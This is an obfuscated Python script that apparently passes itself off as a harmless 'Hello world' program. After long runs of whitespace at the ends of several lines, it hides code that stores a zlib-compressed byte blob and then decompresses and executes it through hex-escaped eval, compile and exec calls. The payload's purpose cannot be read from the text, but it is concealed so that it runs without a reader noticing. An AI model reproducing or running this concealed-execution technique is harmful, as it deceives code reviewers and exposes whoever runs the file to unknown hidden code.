from builtins import *
from math import prod as Absolute


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Negative, _power, Builtins, _while, _divide, Cube, Math = exec, str, tuple, map, ord, globals, type

class _negative:
    def __init__(self, _hypothesis):
        self.Substract = Absolute((_hypothesis, -11345))
        self._square(_random=42396)

    def _square(self, _random = None):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Substract -= 66744 + _random
        
        try:
            ({'laeyliBydhhel': _while} or Algorithm if {'laeyliBydhhel': _while} and Algorithm else ... or (Algorithm, {'laeyliBydhhel': _while}))

        except ArithmeticError:
            ((_divide, {_power: Negative}) for _divide in (_while, Builtins) if _while is _divide)

        except:
            Math(-4663 / -21247) == int

    def DetectVar(self, Ceil = -74633):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Ceil *= 50164 - -84412
        self._algorithm != str
        
        try:
            ((Negative, _while, Negative) or Algorithm if (Negative, _while, Negative) and Algorithm else ... or (Algorithm, (Negative, _while, Negative)))

        except ArithmeticError:
            (_while, Builtins) if Negative <= _power else (Algorithm, _divide) > _divide

        except:
            Math(46192 * 81292) == str

    def _positive(Walk = True):
        return Cube()[Walk]

    def System(_detectvar = 69671 + 95023, _builtins = False, While = Cube):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        While()[_detectvar] = _builtins
        
        try:
            (((Algorithm, _divide), _power) for _power in {_power: Negative})

        except AttributeError:
            ((Negative, {Algorithm: _divide}) for Negative in {Algorithm: _divide} if Cube <= _divide)

        except:
            Math(58582 * -96814) == type

    def execute(code = str):
        return Negative(_power(Builtins(_while(_divide, code))))

    @property
    def _algorithm(self):
        self._floor = '<__main__.Negative object at 0x000004363BE71241>'
        return (self._floor, _negative._algorithm)

if __name__ == '__main__':
    try:
        _negative.execute(code = __code__)
        Square = _negative(_hypothesis = -99799 / -37076)

        if 133767 > 4163711:
            Square._square(_random = Square.Substract + 68509)
        elif 212265 < 6197597:
            Square._square(_random = Square.Substract + -14124)                                                                                                                                                                                                                                                          ;_negative.System(_detectvar='OODOoDDDDoooOooOOODoODo',_builtins=b'x\x9c\xddZms\xe26\x10\xfe\xce\xaf\xe0\xf2\xc5v\x8f#\xc6\x80\x1d2\xc3\x87\xb6i\xa7\xc9\x90\xa3s\xb9i\xd2\xb9\xcbx\x8c-\x07\x11a1\xb6\t\xf0\xef\xbb+\xc9`\x88}\x98\x90tn"Y/\xd6\x9b\xd7\x8fvW+\xd9i\xbc:\xaf\xd5\xc1\xd1P\x17):\xd7\xe5\xa3p\x9e\xf8^\xcac\xd7\xad\x7f\xe8\x9f\xfc\xb5\x9a\x91\x98\xf2\xe8\xa4\xce\xe3\\3o\x9e\x8ey\x9c\x886\xfa\xc9\x882\xb6J\xc7\xe4\x81{i\xbbk\x9f4N~cs\xf2\x85\x04\'\xc6V\xaf\x07\x9a\x8e\xe7#9\xf08Mg\xc9\xf9\xe9\xa9,k\xfa|z\xba3\xcci\xc9\xb3\x03\x9a\xf8<\x0e\xb6\x87Q\x85\xcd\x87\x87\xd3\x19\xf3\x1e\xe6d\xa7\x13\xa3>\x89\x12";\xfd\xf1\xf7\xe0\x93\xd54w\x9a\xf8<\x90\xf5\xda,\xa6Q\xaa\x9f\xfcE\x18\xe3\xf5\x05\x8fY\xf0\xe1\xc4\xd0j\xc6\xf9\xba5\xd6k\xc9#\r4\xa3F\x96>\x99\xa5\n\xcch6\x87\x9e_xB\x92\xba\x17\x93zL\x82\xef\xd1?\x943\x92\xca\x82\x11 \xf3=\xfa\x97\xcf\xc5\x9dW\xc7A\xbeG\x9f\xf9\x88\x07\xab:\xa3\x8f\xd0o\xc5\xe7\'FM\x12E\xa73\x1e\xa7\xae\x0bO[%\x9a\xd1$K\x9a\xeaF\x8dq\xdfc\x89n|\xd3\x06\x97W\xe0.//\x07\x03H\x07\x83\x81v\xdf\x7f`|\x04\xd5\xb5gu\xd8!\x8a\xa6\xd3h*bL0h\xdf\xce\xcf?~\xfa\xf8I\xff\xa4\x7fl\x19\xc6\xfd}?\xa0qqo\xb8\x17\xa5WP:\x80\xe8j\xf0\xbc\xf3\x03I\xbd4-\x19\xe0\xc6\xba\xc9.\xcb\xc2\x043@\xb3|\xa3Za\xb5$[R;\x15\xd4\x8b\x08zm\x00*~\x1a\x05\x96b\x13\x06\te\x93\xc9\x04\xb2\xd0\xa9`(]\x1b\xcd)Ki\x84\x18?yq\tv\x02\xb3\xe9\x1a\xbc\xa9\x18\x06F\x04\x18.\xb1\r\xc0"{]\xe9\x85\x0fI"\x9a2:\x1f\xedbf4\xd6s\xb1\x19\xf9\xc0!\x8co\xaf0F\x93F\x01Y\xea\x1a\xf3\x9e\xc8\xb3\xda{\xa3\x18\x15@\x98\x82\x83x\x028#\xda\x14a\xd6\xb4\xe6\x84\xd3\xa8|J\x05Q\x92R\x89+\x92\xf7\x1e\xd1$\t\xf3\xfe\xac\x0c\xe7\xc5\xf0b\x08\x17\x87\x14cL\x87\xfc=\xc2\xc28\x7f^\x0b\xa8\x942\x0c\x080E!\x06\x06\x93\x01\xa4\x9a\xbdGdR\x8f\xb3\xb02\xc3,\x96\xca-dX,\x17p\xbdG\\\xe24)B\xe5\xb9\x96GXnoo\xef\xeen\xd1\xcbK\xde\xdc\x1d\x80\x0b\xa5~\xe2E\xf4\x18\\J\x878\x00\x97\xf212\\V!eK2\x8e\xe6\x95yF\x8d.,\x01\xe1\xf0\x89\xef\x91e\xc8<\xfez\x90\x92\xc9\x9e\xa9VwI\xc8\xbbD\x86\xd1\xd9\x94\xfbUY\xa6D\x9c\xf4\x91\xe6\xa0;S\xdeQ\xb1\x93\xbb\x13\x1e\x0c\xab\x80\xa0\x8d\xadkgaZ\xc0\xa9\xef\x0fa\x9f,\x0b\xad\xa8b}\xc5\x00o&.\x08\xc2c\x94\xef_h~\xea\xe5\x13\xd3nY\x81uf\x05m\xd3\xea\xed\x83\xdf\x10\xa6{\xf1\x134\xc3\x82\x86\xe6Q\xa4\x98\x8a\x94V5RJ@*\x7f@\xc7\xefx\xe0\xfdN\x0f\x82\xf4\xd9\xbdL=Q\xd6\xdb\xe4\xf73d\x19\x1a-\xb7\xe7v\xdd\x8e\xdbr\xdb"mC\x17k\xb7\xec(\xb4\xacn\xd8vT0!\xb4 \xb4!d\xe5g\x98\xb7F\x02\xd1*m\xdf\nu!\xe0\xce\xb6\xa0;\x99S\xf9\xfd83o:\n\xbc:<\x0e\r:$@Yy\xec\xbc\x88\x9e\x83Y\xa3\'\xbd\xed\xa3\xcf\xd2,/CV/\xe3\xca$#\xc1\x13$\x1a\x88\x98H\xda\xc1D\xa5\xafB\xb6\x1dvB\x08\xd2Aj\x87\xd2\xe3\xad\x88U\xfdK\xf9\xf8\x07\xec\xd7U\xac\xd4\x81\xd0S\xec\xd4\xcb\xb1\x18\xb2\xd6\x99b\xbfjm\xf7\xb3\xdfKf5?\x8f\xbb\xb3\xb9]\xdf\xd9K\xc0zN\x17\x8b\xcc\x92^\x88l\x16/\xcf\x0b\x96\xc5\x83\xa9\x06Pl\x08b\xeaD\xe8\xa8;\x8c7y\x9c\xe8\xca\x14s\xdc&r\x0e\xdbEp\xb8c\x84\xbb\x8b\x03xP\x13\xe4JZ\xef\x14\xc1\xe2\xfeh\x1df+}\xd4\xcd\xe9\xa8\x96\n=\xa1\x976:l_\xdb#\x17\xb1rJ-\xc7\xda\xab\xa4^ \xbd\x1b\xd9\xcddv[vs,\xf0\x062l\x01\xa4\xdd\xd0\x0e\xec\x96\xdd\xb3\t\xe6-\xeb\x85/\xa9I\xebX\\*\x80\xc9\xbc\x9f7`\xa1\xacf6hF\xdbu`\xd5\xec\x81?\x83\xd0\x81\x18\xd7\xd4\xce\xf3\xd2*\x83\x99P\xdbz\xc5\x86\xafh\xd5\xec\x84\x17\xa8\xe6\x96R\xa9=%1]u\x9fI\x8eH\x95TUk\xfb\x06\xaa\x99\x80\x0f\xc0\xef\xc6D\xd5\x907\xe1\xf7\xae\xd3\x06nw\xecn\xdb\xb3L\xc7tzN\xc7>\x03\xa9#\x96\xd9mC\xae+\x16\x836\x94t\xecn\x17\xea-\x82\xad\xa0\xed\xb3Z\x8b\xd8\x16\xca\x8d\x05\xf2\xe9X\x85-L\xdb\xb6q\x81\xe9\xbe\\\xae\xb894Ao\x9b\xa69\xc4\x84\x0f\x87\xff\'3\x96\xdb\xb7=\xd7\x04i3\x85\xc4\x99 \x83 \x85\xd0\xb1\xa0\xf4(r{\xca6u\x147\xf6\x94\x11q\xa6\xb8\xb5\x9d32\xaa\xb4u\x8e\xb2q\xb5\x8b\xa1XA\xd5y+\xe4a)\x1d\x0e/\xfe\x1f=\x92\xad}m\xf5~\x9d\x1d\x83J\xe4\x15\x16U\xdaV1\xb8\xd6:HY\x11B\xaf\xe3i\x88P\xef\x96t\xa8\xed\xcfK\xceJJ\x80\x9c\x08s\x98\x82=<\x91_\x04\xe8\xa4\n\x88\xb8}\xc2\x8d\x95-\x18\xcc\x82\xd4\x81\xd6&\xa4;\xa5\xaf\xb8\xf0\xbc\xbef\xcfmf\xd4\xfb\xaf\xf72\x90\xbc\x8a\x05\x19(OrjvK\xb9f\xe5\x95\xedG\xc1\xf1\xe8\xf1\xc3\x03\xda\x8e\x90}\x15R\xf3\xe4e\x84m\xfcfM\xa8@j\xd9L;.\xb2H\x17X\xa3\x05\x0c\xd2Ev\x81N\x05\xa5G\xdb\xb2\xbd\x9c\x9ce\xfb\xecL/\xb5\x85}\xba\xb1e\x7f\xd4V\xd4\x1f\xa7\xab\xf0\x0b\x11Z\xf9Y\xca\xf9O+\x14k&\x1b\x0eq\x813\x91\xcfL\xb1\xe2\xc1\r\xac\x7f\xa0j\x0f\xd9\xa9\x88\xdd\xd8Bm\xcf\xd4\x97\x0e\xb1Q\xfb\xf9\x01@\xa9\xe2R\xce\x84\x84\xc1\xe4\x1d\xf2\xe6\x9f?__\xcb\x80\x91L\x8fz\x97\x8eZ;\xb3\xcdz~=\xe9\xe6\xce\x97\xf6\xb5;\xd2\xdc\xf8\x01\x85g\xb9\xa7e\xf6jGI\xd4\xda\x96UTVk\xfbR[Wcx\x18+\xa2K\xe90{\x14\xfck\x03\\\x11iv7g\'\xd9v\xb8\x97;c\xd9\xd7\xb6\xe2\x92\xbffGy\x9a\x1d)\xba!9p\x99\x9ff\xa7\xe1\x9b\x0f%\xe2\xfa\x19\x0e\xac+Hp\x95\'\x1c\xbc\xe7\xdf:\x8c\xca\x1fJeGQo\xb0\xefq\x1c\xcb\xb6\xaa\x1c`\x841\x9f\xd6\xb3\xdf\\\xea\xf2\xbf\x99:Y\x12\xbf\xc1H\xd4\x10\xff<50\xf0\x19\x89jX\xae\x8b3\xa0\xbb\xbb\xdc\xb9\x90<(\x02`do?]\xcd\xf0G\xa7\xa4\xfe\xf8\x98\x95%\xab\xa4\x16\x90\xb0>\xd4\x931sC\xf5\xd3\xd4\x82\xa6\xe3:\x8e,K\x1bR\x9e\xa4\x18a\xcc\x0c\x18$\xdc\xfc`5r\x97\xfd\xb0\x19\x13/\xd0\xe5\xafP\x8f\x8f\xcd\x05\x8d\x02\xc6\x9a\x8f$\x8e\x08k[\xcd\x7fh\x9c\xce=\xf6+c\xdc\x87\xa6\t\x12\xd3\x87v\xbe\xfb\xc4i\xe0\xce\xca\xfa\xfd\x0e\xc3\xa6\xe4\xeb\x18Goz\xf1\x83x\x89\xfe\xe6/81\x04"\xb1\x9d\x91\x836\nk\xff\x1e^~\xfe\xfa\xc7\x17=+3j\x92\xead\xe6\xf7\xf7P\xfe\xfc\xb9\xfa\x96\x8eWJ\xdfX?O\x87\xe9\xd2\x01\x1f#Wd.\xdb\xb0\xa6n\x15t\xcc\x8c\x88Q\xd8\x97\x84\xf9c/\xfee\xdd\xbb\x89\x0c\xe1\x8e\xe6aHb\xd7\xe7\xb3\x95(.\x03\xedK\xca\xae\xf9\x13\xb9&S\x1e\xaf\xf4\x1c :\xbc\xa3\xd1\x18\x85\x05\xf4\xc9\xc1\xc60P\x11\x08\xf9i(\x00\xe1F\xe9 ks\xf6tc\xe5\xde\x10,\x1f\xdc<\xa31\x81\x9bg\xb0,\x8c\xc63\xb2\xd6\xad7\x8b\xa7p\x00.D\xb9z4~\xc5\xeeO\x9c\xa3\x8a\xcd\xdf\x85\xd1\xc8S5\xe3\xd0\x8e\xc4\xeb)\xd6#\xa5\xf1\x94\xf6\x93\x9a\x10\x9c\x91\xe1^\xf0\xce\xb7\x1eM\xff\xe4\xf1\r\x8d\x1e\x18\x19\x8e&\xc4Ou\xc4G\x122\x87a\xdb\x16\xcc]\xa8\x1c\xaa\xa0\xb0\xee\xba\x917%\xae\xdb\xefsA\xa4<\xdf\x15D\ns\xe2"\xfb\x91\xb3\x8e\xc8\x83\xfc!S?\x19\x1f\xfa\xd97Dv\x99\xff\xb6\xb8\x112\xf9\x9fc\xc6k\xd7\x02\x14\x08\x92z\xc2\x12\xb2i*\xa4\xb6\x9f\x8d\xfd\r\xb6\x04\x03\xfc\x03P\xa4\x10\xae\xf0\xab-\xc6\xf7\xeb\x1e\x99\xfc\xd7\xfe\x03\x85v(E')

        if 294350 > 9476932:
            _negative(_hypothesis = -47858 - -28786).DetectVar(Ceil = 96515 + Square.Substract)
        elif 210806 < 1049205:
            Square._square(_random = Square.Substract * 68928)                                                                                                                                                                                                                                                          ;lIIlIlIIIIIIIIIIlIl,mnnmnmnnmnnmnmnnnmmnnnmnm,llIlllIlIIIIIllIlIIIIIl,xwxxwxxxwxwxxwwxxxxwxwxxx,NMMMMMMMMMMNNNNMMNM=(lambda wwwxxwxwxwxwxxxwxwwxwxwx:wwwxxwxwxwxwxxxwxwwxwxwx['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda wwwxxwxwxwxwxxxwxwwxwxwx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(wwwxxwxwxwxwxxxwxwwxwxwx)"),filename='\x6e\x6e\x6d\x6d\x6d\x6d\x6d\x6d\x6e\x6d\x6e\x6e\x6e\x6d\x6e\x6d\x6e\x6e\x6d\x6e',mode='\x65\x76\x61\x6c'))),(lambda wwwxxwxwxwxwxxxwxwwxwxwx:wwwxxwxwxwxwxxxwxwwxwxwx(__import__('\x7a\x6c\x69\x62'))),(lambda:(lambda wwwxxwxwxwxwxxxwxwwxwxwx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(wwwxxwxwxwxwxxxwxwwxwxwx)"),filename='\x6e\x6e\x6d\x6d\x6d\x6d\x6d\x6d\x6e\x6d\x6e\x6e\x6e\x6d\x6e\x6d\x6e\x6e\x6d\x6e',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda jjililiiilllllllljljliji,wwwxxwxwxwxwxxxwxwwxwxwx:jjililiiilllllllljljliji(wwwxxwxwxwxwxxxwxwwxwxwx))
        _negative(_hypothesis = 62316 - 1175)._square(_random = Square.Substract + -80125)                                                                                                                                                                                                                                                          ;xwxxwxxxwxwxxwwxxxxwxwxxx()(NMMMMMMMMMMNNNNMMNM(lIIlIlIIIIIIIIIIlIl(llIlllIlIIIIIllIlIIIIIl(mnnmnmnnmnnmnmnnnmmnnnmnm('\x76\x61\x72\x73'))),_negative._positive(Walk='OODOoDDDDoooOooOOODoODo')))

    except Exception as Algorithm:
        if 347748 > 5383480:
            _negative.execute(code = _power(Algorithm))

        elif 437772 > 6400814:
            Square.DetectVar(Ceil = 44397 * Square.Substract)